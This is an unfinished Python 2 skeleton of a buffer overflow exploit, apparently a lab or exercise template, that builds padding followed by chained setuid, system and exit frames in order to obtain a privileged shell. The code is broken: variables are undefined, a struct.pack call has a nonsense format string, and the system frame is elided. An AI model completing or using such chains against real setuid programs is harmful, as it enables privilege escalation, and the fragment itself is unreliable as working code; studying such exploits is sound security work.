#!/usr/bin/python
import struct

s = ""
# create padding
s += padding

# create 3 frames
# create setuid frame
frame += setuid_loc
frame += pop_ret_loc
frame += struct.pack(asdfadsf, 000)

# create system frame
....


s += setuid_frame + system_frame + exit_frame
print s
